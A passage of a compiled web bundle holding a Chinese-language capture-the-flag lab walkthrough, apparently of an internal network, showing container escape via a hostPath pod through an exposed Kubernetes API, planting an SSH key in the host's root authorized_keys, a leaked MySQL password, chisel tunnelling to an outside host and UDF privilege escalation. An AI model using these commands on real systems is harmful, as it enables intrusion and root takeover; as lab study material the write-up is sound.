cat test.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-deployment\nspec:\n  containers:\n  - image: nginx:1.8\n    name: container\n    volumeMounts:\n    - mountPath: /mnt\n      name: test\n  volumes:\n  - name: test\n    hostPath:\n      path: /\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ ./kubectl --insecure-skip-tls-verify -s https://139.*.*.*:10003/ apply -f test.yaml\n-bash: ./kubectl: No such file or directory\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ ~/tools/kubectl --insecure-skip-tls-verify -s https://139.*.*.*:10003/ apply -f test.yaml\nPlease enter Username: a\nPlease enter Password:\npod/nginx-deployment created\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ ~/tools/kubectl --insecure-skip-tls-verify -s https://139.*.*.*:10003/ get pods\nPlease enter Username: a\nPlease enter Password:\nNAME                                READY   STATUS                 RESTARTS   AGE\nnginx-deployment                    1/1     Running                0          7s\nnginx-deployment-58d48b746d-d6x8t   1/1     Running                3          314d\nnginx-deployment-58d48b746d-pg4gl   1/1     Running                3          314d\nnginx-deployment-58d48b746d-s2vwl   1/1     Running                3          314d\nnginx-deployment-58d48b746d-x26mr   1/1     Running                3          314d\n"})}),"\n",(0,s.jsx)(e.p,{children:"pod \u6210\u529f\u90e8\u7f72\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u5f00\u59cb\u5199\u5165 SSH \u79c1\u94a5"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:'\u250c\u2500\u2500(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ ~/tools/kubectl --insecure-skip-tls-verify -s https://139.*.*.*:10003/ exec -it nginx-deployment -- /bin/bash\nPlease enter Username: a\nPlease enter Password:\nroot@nginx-deployment-1:/# whoami\nroot\nroot@nginx-deployment-1:/# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvIVUtOgQh3gYfAXyDcjh3hrXoqyNsV5EKH+LWRDTupdISFx64HX+QG/pvM0fTF9RnAwbZEVL7MzO1bHw+9yLeAHjLgxXQP+e3cHkhnX/5Qkt+6TF3woTI/3zFt/E1sArvs5bRyR028huFN5kyjwPBnedrbgM+gHI2XcYj/Rih53EwpaUIF5AW0RzWuHzvwz385FOZ5M1uplTORyjI3M0YmXQkZhn9b/43SH7SiwzAOXdincKYD0k9J7kmtQlqcY3/gWeUXLZVvj3N5rxg2Q9NSFq0ISSR1DR8baymN+877cuAXufTdDhlbaU8qX1ZNYRC2Pbc4qGlwvB0wfsfT32yJyo82YEFVkOd+z1Nj1GmgSro91EaPFckCVckAgslwc8e6JXTq598yzWck2fiSR9HJ1BQ60Dfog+wSBGozJUDmn+T39OaQKrlADEI6belRTrEdDVriMXia4lHtdT/mdtSHAjvWswy4CfX55fNH5PUKVlt5Q8s6qS3+/ZZuNkBGZU= randark@kali" > /mnt/root/.ssh/authorized_keys\nroot@nginx-deployment-1:/# exit\nexit\n'})}),"\n",(0,s.jsx)(e.p,{children:"\u7136\u540e\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u8fde\u63a5\u5bbf\u4e3b\u673a\u4e86"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ proxychains4 -q ssh -i id_rsa root@172.22.14.37\nWelcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\nWelcome to Alibaba Cloud Elastic Compute Service !\n\nLast login: Fri Aug 16 16:37:43 2024 from 172.22.14.6\nroot@ubuntu-k8s:~# whoami\nroot\n"})}),"\n",(0,s.jsx)(e.h2,{id:"172221437-mysql-\u5386\u53f2\u8bb0\u5f55",children:"172.22.14.37 Mysql \u5386\u53f2\u8bb0\u5f55"}),"\n",(0,s.jsxs)(e.p,{children:["\u53d1\u73b0 ",(0,s.jsx)(e.code,{children:"/root"})," \u76ee\u5f55\u4e0b\u5b58\u5728\u6709 ",(0,s.jsx)(e.code,{children:".mysql_history"})," \u6587\u4ef6\uff0c\u67e5\u770b mysql \u5386\u53f2\u8bb0\u5f55"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-plaintext",children:"_HiStOrY_V2_\nshow\\040databases;\ncreate\\040database\\040flaghaha;\nuse\\040flaghaha\nDROP\\040TABLE\\040IF\\040EXISTS\\040`f1ag`;\nCREATE\\040TABLE\\040`flag06`\\040(\n`id`\\040int\\040DEFAULT\\040NULL,\n\\040\\040`f1agggggishere`\\040varchar(255)\\040DEFAULT\\040NULL\n)\\040ENGINE=MyISAM\\040DEFAULT\\040CHARSET=utf8;\nCREATE\\040TABLE\\040`flag06`\\040(\\040`id`\\040int\\040DEFAULT\\040NULL,\\040\\040\\040`f1agggggishere`\\040varchar(255)\\040DEFAULT\\040NULL\\040)\\040ENGINE=MyISAM\\040DEFAULT\\040CHARSET=utf8;\nshow\\040tables;\ndrop\\040table\\040flag06;\nDROP\\040TABLE\\040IF\\040EXISTS\\040`f1ag`;\nCREATE\\040TABLE\\040`flag04`\\040(\n`id`\\040int\\040DEFAULT\\040NULL,\n\\040\\040`f1agggggishere`\\040varchar(255)\\040DEFAULT\\040NULL\n)\\040ENGINE=MyISAM\\040DEFAULT\\040CHARSET=utf8;\nCREATE\\040TABLE\\040`flag04`\\040(\\040`id`\\040int\\040DEFAULT\\040NULL,\\040\\040\\040`f1agggggishere`\\040varchar(255)\\040DEFAULT\\040NULL\\040)\\040ENGINE=MyISAM\\040DEFAULT\\040CHARSET=utf8;\nINSERT\\040INTO\\040`flag`\\040VALUES\\040(1,\\040'ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==');\nINSERT\\040INTO\\040`flag04`\\040VALUES\\040(1,\\040'ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==');\nexit\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u53ef\u8bfb\u6027\u8f83\u5dee\uff0c\u4f7f\u7528 ",(0,s.jsx)(e.code,{children:"echo"})," \u63d0\u5347\u53ef\u8bfb\u6027"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-sql",metastring:'title="echo -ne $(cat .mysql_history)"',children:"_HiStOrY_V2_\nshow databases;create database flaghaha;\nuse flaghaha DROP TABLE IF EXISTS `f1ag`;\nCREATE TABLE `flag06` (`id` int DEFAULT NULL,   `f1agggggishere` varchar(255) DEFAULT NULL ) ENGINE=MyISAM DEFAULT CHARSET=utf8;\nCREATE TABLE `flag06` (`id` int DEFAULT NULL,   `f1agggggishere` varchar(255) DEFAULT NULL ) ENGINE=MyISAM DEFAULT CHARSET=utf8;\nshow tables;\ndrop table flag06;\nDROP TABLE IF EXISTS `f1ag`;\nCREATE TABLE `flag04` (`id` int DEFAULT NULL,   `f1agggggishere` varchar(255) DEFAULT NULL ) ENGINE=MyISAM DEFAULT CHARSET=utf8;\nCREATE TABLE `flag04` (`id` int DEFAULT NULL,   `f1agggggishere` varchar(255) DEFAULT NULL ) ENGINE=MyISAM DEFAULT CHARSET=utf8;\nINSERT INTO `flag` VALUES (1, 'ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==');\nINSERT INTO `flag04` VALUES (1, 'ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==');\nexit\n"})}),"\n",(0,s.jsx)(e.h2,{id:"flag---04",children:"flag - 04"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-plaintext",children:"flag{da69c459-7fe5-4535-b8d1-15fff496a29f}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"172221437-mysql-udf-\u63d0\u6743",children:"172.22.14.37 Mysql UDF \u63d0\u6743"}),"\n",(0,s.jsxs)(e.p,{children:["\u5728 ",(0,s.jsx)(e.code,{children:"Harbor"})," \u4e2d\uff0c\u6709 ",(0,s.jsx)(e.code,{children:"project/projectadmin"})," \u8fd9\u4e2a\u955c\u50cf\uff0c\u540c\u6837\u7684\u65b9\u6cd5\u83b7\u53d6\u4e0b\u6765\u8fdb\u884c\u5206\u6790\uff0c\u5728\u5176\u4e2d\u7684 jar \u5305\u4e2d\u53ef\u4ee5\u5f97\u5230\u4ee5\u4e0b\u4fe1\u606f"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-plaintext",children:"spring.datasource.url=jdbc:mysql://172.22.10.28:3306/projectadmin?characterEncoding=utf-8&useUnicode=true&serverTimezone=UTC\nspring.datasource.username=root\nspring.datasource.password=My3q1i4oZkJm3\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u7136\u540e\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u653b\u51fb ",(0,s.jsx)(e.code,{children:"172.22.10.28:3306"})," \u8fd9\u4e2a Mysql \u670d\u52a1"]}),"\n",(0,s.jsx)(e.p,{children:"\u9996\u5148\uff0c\u5148\u5c06 Mysql \u670d\u52a1\u8f6c\u53d1\u51fa\u6765"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",metastring:'title="172.22.14.6"',children:"(remote) www-data@ubuntu-oa:/tmp$ ./chisel_1.9.1_linux_amd64 client 172.28.23.17:1337 R:0.0.0.0:10004:172.22.10.28:3306\n2024/08/16 16:25:08 client: Connecting to ws://172.28.23.17:1337\n2024/08/16 16:25:08 server: session#16: tun: proxy#R:10003=>172.22.14.37:6443: Listening\n2024/08/16 16:25:08 client: Connected (Latency 48.219025ms)\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u7136\u540e\u4f7f\u7528 ",(0,s.jsx)(e.a,{href:"https://github.com/SafeGroceryStore/MDUT",children:"SafeGroceryStore/MDUT: MDUT - Multiple Database Utilization Tools"})," \u8fdb\u884c\u5229\u7528"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(3222).Z+"",width:"1204",height:"1013"})}),"\n",(0,s.jsx)(e.p,{children:"\u6210\u529f\u8fde\u63a5"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(56731).Z+"",width:"1507",height:"1283"})}),"\n",(0,s.jsx)(e.p,{children:"\u6267\u884c UDF \u63d0\u6743\u5373\u53ef"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(71019).Z+"",width:"1507",height:"1283"})})]})}function p(n={}){const{wrapper:e}={...(0,i.a)(),...n.components};return e?(0,s.jsx)(e,{...n,children:(0,s.jsx)(d,{...n})}):d(n)}},57757:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240819-111954-34e7b9a8c3b8b9a8301e30010beeafda.png"},83302:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240821-112158-7a134489cc0b1edfbd608b3aba55b2e8.png"},6058:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240822-112239-54ccf88732f8a6d332fbff35d88a8b3c.png"},17116:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240822-152225-ee36cb769581085a5b38bfc06db50a83.png"},2247:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240824-112454-0df8afba1f549e78f1623573bdf3cc19.png"},42953:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240825-152529-27d0199a6ebcb243ef629f36be74506e.png"},96560:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240827-142742-ef13c6580ff7dc8f615886924aa0e376.png"},71641:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240828-142815-1d397aabb9d677246bc394a036f9bc40.png"},89661:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240828-152818-5f8b246ccd9c175769907cb7a3d13aff.png"},78044:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240828-152847-cecbb34969c55391c12636469d060e42.png"},60979:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240833-143346-fbb2d00817af4fac1b55be76a05105d5.png"},15229:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240836-143651-f2fe30e120ea9c648da78ee9566b7cb1.png"},4395:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240837-143717-24135873fff0205df8a8ce9bd49f7456.png"},33027:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240838-143845-7348f5c1719d5d4384b468cd680ca701.png"},98581:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240847-144716-7313c79ad7cb50297529e8037a7d3a4b.png"},3222:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240848-164826-bb888122d019797b92f97753c94a2e93.png"},56731:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240848-164838-4685f5be1542581a84ef2f7a9b5f681f.png"},71019:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240849-164951-5a30102b50b74aaef00ab6d2463b02a9.png"},36692:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20240854-145407-ab105f4a6c8e88181217a039f036a3be.png"},11151:(n,e,a)=>{a.d(e,{Z:()=>l,a:()=>r});var s=a(67294);const i={},t=s.createContext(i);function r(n){const e=s.useContext(t);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function l(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:r(n.components),s.createElement(t.Provider,{value:e},n.children)}}}]);